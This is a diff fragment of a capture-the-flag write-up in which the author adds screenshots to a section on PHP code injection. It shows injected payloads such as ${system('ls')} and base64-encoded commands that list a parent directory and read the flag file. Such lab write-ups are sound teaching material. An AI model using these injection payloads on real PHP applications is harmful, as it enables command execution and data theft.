@@ -10,14 +10,19 @@ It was awesome ctf ,so let's enjoy with writeup.
 ![Screenshot at 2021-11-25 19-26-09](https://user-images.githubusercontent.com/52857059/143482771-46d1f5ad-c4c8-4667-882a-6d2c23525010.png)
 After clicking the Try Again button :
 
+![Screenshot at 2021-11-25 19-32-26](https://user-images.githubusercontent.com/52857059/143484789-d5764601-d715-4dda-87f6-225147275112.png)
+
 I try php code injection ${system('ls')}
+![Screenshot at 2021-11-25 19-35-36](https://user-images.githubusercontent.com/52857059/143484816-0131587c-3d6c-43f1-b947-5afac58b96ae.png)
 
 It works But I can't find flag file.
 let's try another payload with base64_decode function --> ${system(base64_decode(bHMgLi4v))}
+![Screenshot at 2021-11-25 19-39-34](https://user-images.githubusercontent.com/52857059/143484886-c4cdb4ad-025d-46f2-85c7-57850b62bd3d.png)
 
 I got flag name :")
 next step , let's read flag file --> ${system(base64_decode(Y2F0IC4uL2ZsYWcq))}
 
+![Screenshot at 2021-11-25 19-47-54](https://user-images.githubusercontent.com/52857059/143484917-bf996a6b-275b-4965-9982-0742345a348d.png)
 
 
 ## 2- ALLLn1(medium)
